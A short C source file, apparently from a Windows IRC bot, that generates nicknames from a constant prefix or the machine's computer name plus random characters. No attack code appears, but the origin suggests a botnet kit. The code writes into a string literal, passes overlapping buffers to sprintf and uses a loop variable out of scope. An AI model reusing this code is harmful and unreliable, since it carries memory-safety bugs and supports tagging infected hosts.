#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_CONSTNICK

char randchars[] = "abcdefghijklmnopqrstuvwxy1234567890ABCDEFGHIJKLMNOPQRSTUVWXY";

// This is the old Randomized nick using numbers
char *rndnickconst(char *strbuf)
{
 	Sleep(13); // make sure it's random
     srand(GetTickCount());
 	strcpy(strbuf, nickconst);
 	DWORD nickconstlen = strlen(nickconst);
 	DWORD randcharslen = strlen(randchars);
 	for (DWORD i = nickconstlen; i < (nickconstlen+maxrand); i++)
 		strbuf[i] = randchars[rand() % randcharslen];
 	strbuf[i] = 0;
 	return (strbuf); 
 }
#endif

// Compname nick function
char *rndnick(char *strbuf) 
{
    int i;

    LPTSTR lpszCompName="PC";
    DWORD cchBuff = 256;
	BOOL NameGood = FALSE;
 
	Sleep(13); // make sure it's random
    srand(GetTickCount());
    if(!GetComputerName(lpszCompName, &cchBuff)) 
		lpszCompName="PC";
 
	for (i=65;i<91;i++) 
		if (lpszCompName[0] == i)
			NameGood = TRUE;
    for (i=97;i<123;i++)
		if (lpszCompName[0] == i)
			NameGood = TRUE;
    if (!NameGood) 
		lpszCompName="PC";
    sprintf(strbuf, "%s", lpszCompName);

    for (i=1;i <= maxrand;i++) 
		sprintf(strbuf, "%s%i", strbuf, rand()%10);
 
	return (strbuf);
}

